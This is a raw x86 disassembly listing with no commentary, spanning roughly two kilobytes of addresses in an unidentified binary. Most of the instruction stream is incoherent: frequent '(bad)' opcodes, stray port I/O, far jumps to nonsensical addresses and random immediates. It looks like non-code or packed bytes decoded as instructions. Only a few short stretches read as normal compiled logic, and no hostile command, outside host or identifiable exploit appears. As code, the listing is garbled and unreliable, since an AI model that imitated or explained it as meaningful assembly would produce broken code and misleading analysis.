  40beb3:	pop    esp
  40beb4:	jl     0x40bedc
  40beb6:	push   esp
  40beb7:	xor    DWORD PTR [ecx+edi*2],esi
  40beba:	or     dl,BYTE PTR [ebp+0x5a633143]
  40bec0:	push   esi
  40bec1:	pop    eax
  40bec2:	ret    0x66c0
  40bec5:	std    
  40bec6:	xchg   esp,eax
  40bec7:	lds    esi,FWORD PTR fs:[ecx+0x7606a4f]
  40bece:	idiv   dh
  40bed0:	pop    eax
  40bed1:	jbe    0x40be6b
  40bed3:	dec    edi
  40bed4:	leave  
  40bed5:	xor    edi,DWORD PTR [ebp+0x9]
  40bed8:	in     al,0xd5
  40beda:	xchg   ebx,eax
  40bedb:	out    dx,al
  40bedc:	(bad)  
  40bedd:	or     esi,DWORD PTR [edx+eax*1+0x53]
  40bee1:	pushf  
  40bee2:	lahf   
  40bee3:	jl     0x40be67
  40bee5:	xor    BYTE PTR [ebp*8-0x9795b6c],0x9f
  40beed:	mov    dl,0x8d
  40beef:	rcr    BYTE PTR [esi+edx*4],1
  40bef2:	fsub   st,st(6)
  40bef4:	out    dx,al
  40bef5:	mov    bl,0x8d
  40bef7:	jmp    0x5df71504
  40befc:	(bad)
  40beff:	xor    eax,0x9f8aed86
  40bf04:	jmp    0x5310f235
  40bf09:	mov    esi,0x38e37704
  40bf0e:	nop
  40bf0f:	retf   0x33e1
  40bf12:	call   0xd12cf928
  40bf17:	dec    edi
  40bf18:	mov    esp,ecx
  40bf1a:	dec    ebp
  40bf1b:	mov    al,ds:0x69abe85f
  40bf20:	sbb    DWORD PTR [ecx],0x78926ef2
  40bf26:	cli    
  40bf27:	add    BYTE PTR ds:0x12743ff9,ch
  40bf2d:	xchg   si,ax
  40bf2f:	jnp    0x40bf79
  40bf31:	(bad)  
  40bf34:	xchg   BYTE PTR [eax-0x46],ah
  40bf37:	imul   ecx,ebx,0x33361b33
  40bf3d:	daa    
  40bf3e:	icebp  
  40bf3f:	mov    esi,0xe81f2fa9
  40bf44:	mov    ds:0x35b73c34,eax
  40bf49:	adc    DWORD PTR [edx],esp
  40bf4b:	outs   dx,DWORD PTR ds:[esi]
  40bf4c:	jl     0x40bfcb
  40bf4e:	dec    edx
  40bf4f:	(bad)  
  40bf50:	fwait
  40bf51:	call   0x6c4a06ef
  40bf56:	and    al,BYTE PTR [ebx*2-0x692dd2a4]
  40bf5d:	fcom   DWORD PTR [esi-0x56836a4]
  40bf63:	mov    ch,0xd8
  40bf65:	lds    ebx,FWORD PTR es:[edi-0x51]
  40bf69:	or     eax,DWORD PTR [edi+0x3e]
  40bf6c:	jbe    0x40bf91
  40bf6e:	ins    DWORD PTR es:[edi],dx
  40bf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf70:	loope  0x40bfbc
  40bf72:	out    dx,eax
  40bf73:	adc    eax,0x96fcd82a
  40bf78:	push   edi
  40bf79:	jno    0x40bf0c
  40bf7b:	nop
  40bf7c:	xchg   edx,eax
  40bf7d:	push   ds
  40bf7e:	ret    
  40bf7f:	inc    edi
  40bf80:	mov    eax,ds:0xc25e63ec
  40bf85:	aad    0x44
  40bf87:	aas    
  40bf88:	gs retf 0x58a
  40bf8c:	push   esi
  40bf8d:	ins    BYTE PTR es:[edi],dx
  40bf8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf8f:	test   DWORD PTR [ebx],edx
  40bf91:	xchg   esp,eax
  40bf92:	(bad)  
  40bf93:	mov    esp,edi
  40bf95:	push   eax
  40bf96:	int    0x8f
  40bf98:	inc    ecx
  40bf99:	ret    
  40bf9a:	pop    ebp
  40bf9b:	(bad)  [esi+0x43]
  40bf9e:	fucomp st(2)
  40bfa0:	cmp    BYTE PTR [esi+ecx*1],0xd4
  40bfa4:	pusha  
  40bfa5:	jno    0x40bfcf
  40bfa7:	cmc    
  40bfa8:	dec    ecx
  40bfa9:	sbb    ebx,DWORD PTR [esi+0x61]
  40bfac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfae:	dec    ebp
  40bfaf:	sub    DWORD PTR [ecx+0x46],ebp
  40bfb2:	mov    bh,0xe7
  40bfb4:	push   0x4db23fb
  40bfb9:	sub    ebx,DWORD PTR [esi+0x63157411]
  40bfbf:	and    dl,BYTE PTR [edx+0x649dca5d]
  40bfc5:	test   DWORD PTR [edx],esi
  40bfc7:	addr16 aas 
  40bfc9:	dec    edi
  40bfca:	jl     0x40bffe
  40bfcc:	clc    
  40bfcd:	test   al,0xd5
  40bfcf:	loope  0x40bfca
  40bfd1:	dec    esi
  40bfd2:	(bad)  
  40bfd4:	push   eax
  40bfd5:	mov    cl,0x2e
  40bfd7:	cmp    bh,al
  40bfd9:	xchg   BYTE PTR [edi],bl
  40bfdb:	rcr    BYTE PTR [ebp-0x515a9be8],1
  40bfe1:	pop    esi
  40bfe2:	adc    BYTE PTR [ecx+ebp*1+0x1d9fa018],dh
  40bfe9:	xor    DWORD PTR [ebp-0x744cb65c],edx
  40bfef:	icebp  
  40bff0:	mov    cl,0xc6
  40bff2:	mov    esi,0x622419c1
  40bff7:	xchg   ebp,eax
  40bff8:	jbe    0x40c008
  40bffa:	cmc    
  40bffb:	xor    eax,0x32babd1c
  40c000:	es stos DWORD PTR es:[edi],eax
  40c002:	sub    ch,BYTE PTR [edi-0x77]
  40c005:	mov    WORD PTR [ebp+0x24],gs
  40c008:	xchg   ecx,eax
  40c009:	mov    eax,ds:0x386ba1b7
  40c00e:	not    BYTE PTR ds:0x61007dc0
  40c014:	sbb    bl,al
  40c016:	mov    edi,0xc333b1b7
  40c01b:	ja     0x40c004
  40c01d:	add    bl,BYTE PTR [ebp+0x67]
  40c020:	pop    DWORD PTR [ebx+0x5c181ad2]
  40c026:	xchg   bx,ax
  40c028:	cdq    
  40c029:	ss dec eax
  40c02b:	mov    edx,0x2f6a783d
  40c030:	jno    0x40c019
  40c032:	push   0x7
  40c034:	out    dx,al
  40c035:	push   esp
  40c036:	in     eax,0xeb
  40c038:	fisttp QWORD PTR [edx]
  40c03a:	imul   ebx,ecx,0x8
  40c03d:	xchg   esp,eax
  40c03e:	xor    BYTE PTR [ebp+0x5ca7433b],bh
  40c044:	test   al,0xfb
  40c046:	stos   BYTE PTR es:[edi],al
  40c047:	fimul  WORD PTR ds:0xb1950728
  40c04d:	ja     0x40c08c
  40c04f:	int    0xf
  40c051:	js     0x40c054
  40c053:	sbb    eax,ecx
  40c055:	and    ebx,DWORD PTR [ebx+0x31]
  40c058:	xchg   edi,eax
  40c059:	pop    ecx
  40c05a:	sbb    al,0x8d
  40c05c:	sub    BYTE PTR [ebx+0x7061c0d0],cl
  40c062:	push   es
  40c063:	or     al,0xa8
  40c065:	test   eax,0x44c656d2
  40c06a:	mov    ds:0x59311749,eax
  40c06f:	(bad)  
  40c070:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c071:	retf   
  40c072:	sti    
  40c073:	xor    eax,0xe185ab6
  40c078:	inc    ebp
  40c079:	sbb    DWORD PTR [edi-0x5b],esp
  40c07c:	leave  
  40c07d:	gs mov es,edi
  40c080:	sahf   
  40c081:	push   ecx
  40c082:	mov    eax,0x8d8f8443
  40c087:	retf   
  40c088:	push   0x121bb470
  40c08d:	xlat   BYTE PTR ds:[ebx]
  40c08e:	push   ecx
  40c08f:	mul    BYTE PTR [ebx]
  40c091:	call   0x14fe744
  40c096:	or     eax,0xb7661262
  40c09b:	mov    esi,0x49a713c0
  40c0a0:	shl    BYTE PTR [ecx-0x5bd39564],cl
  40c0a6:	add    eax,0x450547f2
  40c0ab:	scas   eax,DWORD PTR es:[edi]
  40c0ac:	retf   0x5c20
  40c0af:	les    esi,FWORD PTR [edi]
  40c0b1:	call   0xaa5e:0x85e591a6
  40c0b8:	push   edi
  40c0b9:	leave  
  40c0ba:	aas    
  40c0bb:	pop    edx
  40c0bc:	je     0x40c09a
  40c0be:	nop
  40c0bf:	outs   dx,DWORD PTR ds:[esi]
  40c0c0:	(bad)
  40c0c3:	je     0x40c076
  40c0c5:	jns    0x40c113
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	add    BYTE PTR gs:[esi+0x47],0x69
  40c108:	sti    
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0d8
  40c110:	xor    ch,BYTE PTR [eax+0xd]
  40c113:	cmp    ah,ch
  40c115:	push   cs
  40c116:	or     al,0x80
  40c118:	icebp  
  40c119:	in     al,dx
  40c11a:	repnz pop esi
  40c11c:	sahf   
  40c11d:	fmul   QWORD PTR [eax+0x564fb057]
  40c123:	repnz cmp eax,0xae644c28
  40c129:	mov    dh,0x16
  40c12b:	inc    esi
  40c12c:	call   0x19ca0c0f
  40c131:	or     edi,esp
  40c133:	ss push ds
  40c135:	fidiv  DWORD PTR [edx-0x53a5e639]
  40c13b:	aaa    
  40c13c:	imul   ebp,DWORD PTR gs:[edi-0x64b2483f],0x57
  40c144:	pop    ecx
  40c145:	push   esi
  40c146:	jno    0x40c18a
  40c148:	jecxz  0x40c140
  40c14a:	ffreep st(2)
  40c14c:	pop    edi
  40c14d:	sub    BYTE PTR [edi+0x28],cl
  40c150:	push   edx
  40c151:	gs and eax,0x50382e5f
  40c157:	inc    eax
  40c158:	out    dx,eax
  40c159:	pop    ecx
  40c15a:	cmp    al,0x20
  40c15c:	jmp    0x40c152
  40c15e:	stc    
  40c15f:	jb     0x40c141
  40c161:	leave  
  40c162:	jg     0x40c1cf
  40c164:	imul   esp,DWORD PTR [edi+0x66c4e73d],0xf5ec0965
  40c16e:	dec    esp
  40c16f:	in     eax,0xf2
  40c171:	sub    BYTE PTR [esi],bh
  40c173:	div    BYTE PTR [ebp-0x7aa1d6e2]
  40c179:	mov    esp,0x6450b741
  40c17e:	cmp    eax,0xa6fed5bd
  40c183:	(bad)  
  40c184:	stc    
  40c185:	jbe    0x40c1dd
  40c187:	sub    dh,dh
  40c189:	dec    ebp
  40c18a:	iret   
  40c18b:	push   0xff7acd42
  40c190:	xchg   ebx,eax
  40c191:	jp     0x40c1c5
  40c193:	sub    DWORD PTR [ecx+0x2c],edx
  40c196:	imul   esp,DWORD PTR [edi-0xd503417],0xffffffcc
  40c19d:	ss dec edx
  40c19f:	pusha  
  40c1a0:	sub    eax,0xe6f6cd8e
  40c1a5:	jae    0x40c17a
  40c1a7:	push   ecx
  40c1a8:	mov    ecx,0x7d7fa8b5
  40c1ad:	mov    DWORD PTR [ebx+edi*4],0x7f5186c3
  40c1b4:	mov    dl,0x77
  40c1b6:	test   DWORD PTR [ebx+0x3c5f7cca],edi
  40c1bc:	inc    eax
  40c1bd:	int    0xdc
  40c1bf:	xchg   ebx,eax
  40c1c0:	inc    edi
  40c1c1:	aaa    
  40c1c2:	cld    
  40c1c3:	mov    dh,0xe1
  40c1c5:	cwde   
  40c1c6:	inc    eax
  40c1c7:	xor    al,0xbe
  40c1c9:	js     0x40c204
  40c1cb:	jno    0x40c191
  40c1cd:	les    eax,FWORD PTR [eax+0x36]
  40c1d0:	xchg   DWORD PTR [edx],ebx
  40c1d2:	jle    0x40c1dd
  40c1d4:	sbb    esi,DWORD PTR [ebp-0x10ea402f]
  40c1da:	fwait
  40c1db:	out    0xfd,eax
  40c1dd:	push   DWORD PTR [ecx+0x1d]
  40c1e0:	mov    ecx,0xaeee8e2d
  40c1e5:	mov    ebp,0x4c7e1ff7
  40c1ea:	push   es
  40c1eb:	pop    ds
  40c1ec:	jge    0x40c18e
  40c1ee:	es xchg esp,eax
  40c1f0:	and    ebx,0x7e
  40c1f3:	adc    edx,eax
  40c1f5:	in     al,dx
  40c1f6:	in     al,dx
  40c1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f8:	ins    BYTE PTR es:[edi],dx
  40c1f9:	mov    ebx,0xaf7db1d3
  40c1fe:	dec    ebx
  40c1ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c200:	repz adc eax,0x53ceb7e2
  40c206:	inc    esp
  40c207:	jp     0x40c1a0
  40c209:	mov    dh,0x4a
  40c20b:	push   ecx
  40c20c:	pop    esp
  40c20d:	ja     0x40c1c6
  40c20f:	in     eax,0xbf
  40c211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c212:	mov    ds:0x4030c185,al
  40c217:	(bad)  
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	add    eax,0x4314b27a
  40c21e:	ins    DWORD PTR es:[edi],dx
  40c21f:	aaa    
  40c220:	aas    
  40c221:	mov    ds:0x36df2f42,eax
  40c226:	jbe    0x40c221
  40c228:	scas   al,BYTE PTR es:[edi]
  40c229:	xor    edx,edi
  40c22b:	into   
  40c22c:	push   ecx
  40c22d:	fpatan 
  40c22f:	cwde   
  40c230:	jl     0x40c20f
  40c232:	pop    es
  40c233:	idiv   DWORD PTR [ecx]
  40c235:	mov    dl,0xf1
  40c237:	mov    cl,0xaf
  40c239:	mov    ebp,0xa556a427
  40c23e:	in     eax,dx
  40c23f:	cmp    edi,DWORD PTR [esi-0x79204f0e]
  40c245:	nop
  40c246:	das    
  40c247:	lock jbe 0x40c2b1
  40c24a:	popf   
  40c24b:	cmp    ebx,edx
  40c24d:	xor    ecx,DWORD PTR [edi+0x25]
  40c250:	add    cl,BYTE PTR [edi+0x1d]
  40c253:	jno    0x40c1ec
  40c255:	js     0x40c24f
  40c257:	dec    edx
  40c258:	adc    DWORD PTR ds:0xf8e50eb9,0x25130bcf
  40c262:	push   eax
  40c263:	and    BYTE PTR [ebx],bl
  40c265:	or     BYTE PTR [ebx-0x6ebef8e2],ch
  40c26b:	js     0x40c2e7
  40c26d:	xor    al,0x6a
  40c26f:	dec    edx
  40c270:	aaa    
  40c271:	mov    fs,WORD PTR ds:0x8206f5d4
  40c277:	in     eax,dx
  40c278:	pop    edx
  40c279:	jnp    0x40c2c1
  40c27b:	jmp    0xc355:0xeebbba3a
  40c282:	mov    cl,0xfd
  40c284:	mov    eax,ds:0x65eabca8
  40c289:	cdq    
  40c28a:	sti    
  40c28b:	(bad)  
  40c28c:	dec    eax
  40c28d:	push   eax
  40c28e:	iret   
  40c28f:	pop    esp
  40c290:	imul   esp,DWORD PTR [eax-0x5f],0x53
  40c294:	xor    BYTE PTR [ecx+edi*8+0x4c],ah
  40c298:	(bad)  
  40c299:	idiv   dl
  40c29b:	lods   eax,DWORD PTR ds:[esi]
  40c29c:	xchg   ebx,eax
  40c29d:	push   esi
  40c29e:	js     0x40c2ab
  40c2a0:	dec    edx
  40c2a1:	adc    ecx,edi
  40c2a3:	mov    ds:0xc04b5e8c,al
  40c2a8:	dec    edx
  40c2a9:	cwde   
  40c2aa:	xor    edx,DWORD PTR [ebx+0xc]
  40c2ad:	push   0x1461aec1
  40c2b2:	loopne 0x40c2e4
  40c2b4:	cmp    cl,BYTE PTR [eax+0x25]
  40c2b7:	pop    ecx
  40c2b8:	rcl    DWORD PTR [ebp+0x335cf249],0x3a
  40c2bf:	imul   ebx,DWORD PTR [ebx-0x23a0b17a],0xf8f73091
  40c2c9:	in     al,dx
  40c2ca:	push   eax
  40c2cb:	xor    edi,ecx
  40c2cd:	imul   edi,edi,0xffffffae
  40c2d0:	sub    eax,ecx
  40c2d2:	fisttp DWORD PTR [ebx+0x2]
  40c2d5:	mov    BYTE PTR [ebp+0x26],0x21
  40c2d9:	inc    edx
  40c2db:	enter  0x4950,0xa
  40c2df:	push   edi
  40c2e0:	adc    DWORD PTR [esi+0x70908004],ebp
  40c2e6:	call   0x36db:0x4920ec58
  40c2ed:	fs aam 0x6d
  40c2f0:	ret    0x7a7f
  40c2f3:	ds mov ecx,0x36dbee86
  40c2f9:	dec    eax
  40c2fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2fb:	pop    ebp
  40c2fc:	jbe    0x40c31b
  40c2fe:	push   esi
  40c2ff:	adc    DWORD PTR [ebx-0x2b],0x45cf0c65
  40c306:	rcr    ah,1
  40c308:	inc    ebp
  40c309:	ficomp DWORD PTR [edi]
  40c30b:	mov    DWORD PTR [esi-0x53],0x7777b5b6
  40c312:	idiv   BYTE PTR [ebx]
  40c314:	(bad)  
  40c315:	push   ss
  40c316:	cmp    eax,ecx
  40c318:	retf   0xba94
  40c31b:	xor    cl,0x16
  40c31e:	mov    dl,0x8
  40c320:	sar    dl,0xfa
  40c323:	das    
  40c324:	loopne 0x40c390
  40c326:	fs clc 
  40c328:	xchg   esi,eax
  40c329:	ss jmp 0x4617:0x40c86fb2
  40c331:	dec    edx
  40c332:	jle    0x40c3a5
  40c334:	push   ebp
  40c335:	into   
  40c336:	in     al,0xd0
  40c338:	dec    edi
  40c339:	scas   al,BYTE PTR es:[edi]
  40c33a:	inc    esi
  40c33b:	mov    esp,DWORD PTR [ebx-0x5fdc6f20]
  40c341:	aam    0x16
  40c343:	sbb    BYTE PTR [edx],dh
  40c345:	sub    eax,0xe12502f9
  40c34a:	sub    bl,BYTE PTR [eax+0xf]
  40c34d:	stc    
  40c34e:	out    0xcb,al
  40c350:	paddd  mm0,mm4
  40c353:	pop    es
  40c354:	mov    BYTE PTR [edi],dh
  40c356:	inc    ebp
  40c357:	repnz sbb al,BYTE PTR [ebx+0x30f9172]
  40c35e:	xchg   esi,eax
  40c35f:	mov    ah,0x83
  40c361:	xor    ebp,DWORD PTR [bx+di]
  40c364:	sar    ch,1
  40c366:	je     0x40c329
  40c368:	iret   
  40c369:	arpl   di,ax
  40c36b:	lock inc eax
  40c36d:	cmp    eax,0x862fabc6
  40c372:	or     al,dl
  40c374:	mov    dl,BYTE PTR [esp+ecx*1]
  40c377:	jb     0x40c322
  40c379:	lods   al,BYTE PTR ds:[esi]
  40c37a:	iret   
  40c37b:	push   cs
  40c37c:	and    esp,edx
  40c37e:	inc    edi
  40c37f:	retf   
  40c380:	sbb    ebx,DWORD PTR [esi-0x6d127db3]
  40c386:	outs   dx,BYTE PTR ds:[esi]
  40c387:	xor    al,0xab
  40c389:	pop    edi
  40c38a:	sbb    al,0x6b
  40c38c:	inc    edx
  40c38d:	sbb    BYTE PTR [ecx],dh
  40c38f:	arpl   dx,bx
  40c391:	push   esi
  40c392:	mov    bl,0xa
  40c394:	sub    al,0xe4
  40c396:	ss dec ebx
  40c398:	pop    ds
  40c399:	out    dx,eax
  40c39a:	xor    BYTE PTR ds:0x9cf1072b,0xa3
  40c3a1:	xchg   ebp,eax
  40c3a2:	test   BYTE PTR ss:[ebx],al
  40c3a5:	fyl2xp1 
  40c3a7:	sub    ebx,DWORD PTR [ebx]
  40c3a9:	mov    eax,ds:0x433a5643
  40c3ae:	lods   al,BYTE PTR ds:[esi]
  40c3af:	xor    al,0xa0
  40c3b1:	or     DWORD PTR [edx],esp
  40c3b3:	into   
  40c3b4:	adc    eax,0x3bd92181
  40c3b9:	outs   dx,DWORD PTR ds:[esi]
  40c3ba:	repz xor esp,DWORD PTR [edi-0x65223f2b]
  40c3c1:	xchg   esi,eax
  40c3c2:	and    BYTE PTR [eax],ch
  40c3c4:	adc    eax,0x49313dbe
  40c3c9:	or     al,0x89
  40c3cb:	sti    
  40c3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3cd:	mov    ebx,0x72dd2acf
  40c3d2:	(bad)
  40c3d6:	lock add BYTE PTR [esi],cl
  40c3d9:	pushf  
  40c3da:	add    BYTE PTR [ebx+0x11],0x21
  40c3de:	pop    ss
  40c3df:	or     dh,BYTE PTR [ecx+0x4c]
  40c3e2:	lahf   
  40c3e3:	inc    edx
  40c3e4:	mov    bl,0x9d
  40c3e6:	mov    ds:0xe014f567,eax
  40c3eb:	out    dx,al
  40c3ec:	out    dx,eax
  40c3ed:	xchg   ebp,eax
  40c3ee:	and    edi,esp
  40c3f0:	sub    al,0xf2
  40c3f2:	(bad)  
  40c3f4:	nop
  40c3f5:	jmp    0x4a705f35
  40c3fa:	xchg   esp,eax
  40c3fb:	lds    ebp,FWORD PTR [esi-0x5f2f71c3]
  40c401:	retf   0xe4ab
  40c404:	(bad)  
  40c405:	mov    dl,0x56
  40c407:	adc    eax,ecx
  40c409:	xor    BYTE PTR [esi-0x61],bh
  40c40c:	retf   
  40c40d:	mov    WORD PTR [ebp+0x20],cs
  40c410:	pop    ss
  40c411:	scas   al,BYTE PTR es:[edi]
  40c412:	mov    dh,0x21
  40c414:	leave  
  40c415:	pop    esp
  40c416:	mov    WORD PTR [edi+0x5d],gs
  40c419:	popa   
  40c41a:	cmp    BYTE PTR [ecx+0x3cdc60ce],bh
  40c420:	sti    
  40c421:	dec    edi
  40c422:	icebp  
  40c423:	mov    eax,0x5a476ded
  40c428:	(bad)
  40c42c:	ins    DWORD PTR es:[edi],dx
  40c42d:	jl     0x40c468
  40c42f:	xor    ecx,DWORD PTR [edx-0x71]
  40c432:	fbstp  TBYTE PTR [eax-0x22]
  40c435:	cmp    eax,0x3aaa897c
  40c43a:	ds push 0xfffffff1
  40c43d:	push   es
  40c43e:	or     DWORD PTR [ebp+0x729b0884],0x89660032
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x6c]
  40c49b:	aas    
  40c49c:	repz nop DWORD PTR [edi+0x7d2e7e7e]
  40c4a4:	jle    0x40c524
  40c4a6:	call   0x403a:0x48e4adbc
  40c4ad:	sbb    al,0xef
  40c4af:	test   eax,0x4002cad1
  40c4b4:	xor    DWORD PTR ds:[edx],ebx
  40c4b7:	enter  0xff20,0xb6
  40c4bb:	push   0xffffffa9
  40c4bd:	jb     0x40c53c
  40c4bf:	push   ebx
  40c4c0:	sub    ebx,esp
  40c4c2:	imul   DWORD PTR [esi-0x69c8ebe4]
  40c4c8:	mov    esp,0x284a33e0
  40c4cd:	pop    ebx
  40c4ce:	aad    0x8a
  40c4d0:	adc    ecx,DWORD PTR [ebp+0x72f2c26d]
  40c4d6:	sbb    BYTE PTR [ecx+0x65],dh
  40c4d9:	push   0x922ab61
  40c4de:	lahf   
  40c4df:	clc    
  40c4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4e1:	and    ah,dh
  40c4e3:	add    eax,0xb1ffc9d5
  40c4e8:	jne    0x40c4fb
  40c4ea:	fistp  QWORD PTR [ebx]
  40c4ec:	mov    ebp,0x6fe9032c
  40c4f1:	jmp    0xbfbf:0x75f18635
  40c4f8:	pop    esp
  40c4f9:	cmp    al,0x9d
  40c4fb:	push   cs
  40c4fc:	int    0xe8
  40c4fe:	mov    bl,BYTE PTR [ecx+0x72]
  40c501:	cmp    esp,edi
  40c503:	or     DWORD PTR [ecx+0xd],0x8ee98ce8
  40c50a:	mov    al,ds:0x3e77ff5e
  40c50f:	sbb    eax,0x840461a3
  40c514:	push   ds
  40c515:	or     DWORD PTR [ecx+0x31048be2],eax
  40c51b:	dec    ebp
  40c51c:	sub    BYTE PTR [ebx+0x74f971c2],cl
  40c522:	iret   
  40c523:	and    DWORD PTR [ebx+eax*8-0x38],ebx
  40c527:	mov    edx,0xd50ebab9
  40c52c:	repnz mov al,ds:0xcd426bb6
  40c532:	fwait
  40c533:	mov    dh,BYTE PTR ds:0x2f24fd71
  40c539:	push   esp
  40c53a:	sbb    BYTE PTR [ecx+0x12],ah
  40c53d:	xor    al,0xbd
  40c53f:	xchg   edx,eax
  40c540:	jmp    0x8f9a18fc
  40c545:	mov    ds:0xfd8f6cd6,al
  40c54a:	add    al,0xaa
  40c54c:	mov    ecx,0xc02681fd
  40c551:	stos   BYTE PTR es:[edi],al
  40c552:	xor    BYTE PTR [ecx+0x1337ccf],ch
  40c558:	popa   
  40c559:	push   ebp
  40c55a:	(bad)  
  40c55b:	shr    BYTE PTR [eax+0x39664193],1
  40c561:	xchg   edi,eax
  40c562:	sub    ebp,ebp
  40c564:	in     al,dx
  40c565:	jp     0x40c503
  40c567:	dec    esi
  40c568:	mov    ecx,0xe7e9f9b6
  40c56d:	out    0xc3,al
  40c56f:	outs   dx,BYTE PTR ds:[esi]
  40c570:	stc    
  40c571:	push   0xffffffa9
  40c573:	sub    ebx,eax
  40c575:	pop    ebp
  40c576:	(bad)  
  40c577:	mov    bl,ch
  40c579:	jecxz  0x40c597
  40c57b:	xor    al,0x13
  40c57d:	sub    al,0x86
  40c57f:	pop    ds
  40c580:	mov    edi,0x896cc4c0
  40c585:	push   ds
  40c586:	cmp    al,0xd1
  40c588:	test   BYTE PTR [esi],bh
  40c58a:	or     eax,0x56097268
  40c58f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c591:	xor    edi,DWORD PTR [edi-0x645f8e20]
  40c597:	idiv   DWORD PTR [ebp-0x58]
  40c59a:	fdiv   st,st(5)
  40c59c:	xor    DWORD PTR [ebp+0x2467dc53],0x5c
  40c5a3:	jns    0xef63898
  40c5a9:	gs push eax
  40c5ab:	mov    dl,0x57
  40c5ad:	loope  0x40c62c
  40c5af:	icebp  
  40c5b0:	les    ebp,FWORD PTR [edx+0x4c008c3d]
  40c5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b7:	pop    ss
  40c5b8:	xor    BYTE PTR [eax-0x60],0xe8
  40c5bc:	les    eax,FWORD PTR [esi-0x63]
  40c5bf:	or     al,0x4a
  40c5c1:	add    al,0xfe
  40c5c3:	or     DWORD PTR [edx+0x2b76a7a2],edi
  40c5c9:	sub    BYTE PTR [edi-0xd],ah
  40c5cc:	xchg   esi,eax
  40c5cd:	xchg   DWORD PTR [ecx-0x8bb576f],esp
  40c5d3:	rcr    DWORD PTR [edx],1
  40c5d5:	cmp    cl,BYTE PTR [edx]
  40c5d7:	jno    0x40c57b
  40c5d9:	jg     0x40c643
  40c5db:	xor    cl,BYTE PTR [edx+0x170d0898]
  40c5e1:	inc    edx
  40c5e2:	push   eax
  40c5e3:	ror    BYTE PTR [ebx+edx*8+0x5c],1
  40c5e7:	jp     0x40c5b4
  40c5e9:	adc    al,0x35
  40c5eb:	lods   eax,DWORD PTR ds:[esi]
  40c5ec:	pop    eax
  40c5ed:	xor    DWORD PTR [esi],eax
  40c5ef:	push   ebx
  40c5f0:	loopne 0x40c66c
  40c5f2:	arpl   WORD PTR [esi+edx*1],bp
  40c5f5:	mov    ds:0xa6ba0ebd,eax
  40c5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5fb:	gs sti 
  40c5fd:	push   esi
  40c5fe:	dec    edi
  40c5ff:	jo     0x40c661
  40c601:	loope  0x40c5fd
  40c603:	sbb    BYTE PTR [ebx],0xaf
  40c606:	mov    bh,0xb7
  40c608:	mov    ah,0xdf
  40c60a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40c60c:	ins    BYTE PTR es:[edi],dx
  40c60d:	outs   dx,BYTE PTR ds:[esi]
  40c60e:	aaa    
  40c60f:	outs   dx,BYTE PTR ds:[esi]
  40c610:	add    BYTE PTR [edx+0x7b],0x2e
  40c614:	test   eax,0xdffff8d8
  40c619:	pop    edx
  40c61a:	lea    ecx,[ecx+0x3bf1c565]
  40c620:	mov    bh,0x5a
  40c622:	fist   DWORD PTR [eax-0x7fe276c2]
  40c628:	dec    eax
  40c629:	xchg   edi,eax
  40c62a:	nop
  40c62b:	mov    dl,ch
  40c62d:	into   
  40c62e:	out    0xfc,al
  40c630:	pop    esp
  40c631:	push   cs
  40c632:	fimul  DWORD PTR [ecx+0x26]
  40c635:	pop    esi
  40c636:	jecxz  0x40c600
  40c638:	mov    dl,0x76
  40c63a:	test   eax,0x837bc443
  40c63f:	adc    ebx,0xfffffffa
  40c642:	repz push edi
  40c644:	cmp    ebx,eax
  40c646:	or     ebp,edx
  40c648:	in     eax,0x71
  40c64a:	fwait
  40c64b:	loope  0x40c5d4
  40c64d:	jge    0x40c6c9
  40c64f:	iret   
  40c650:	bound  ecx,QWORD PTR [ecx]
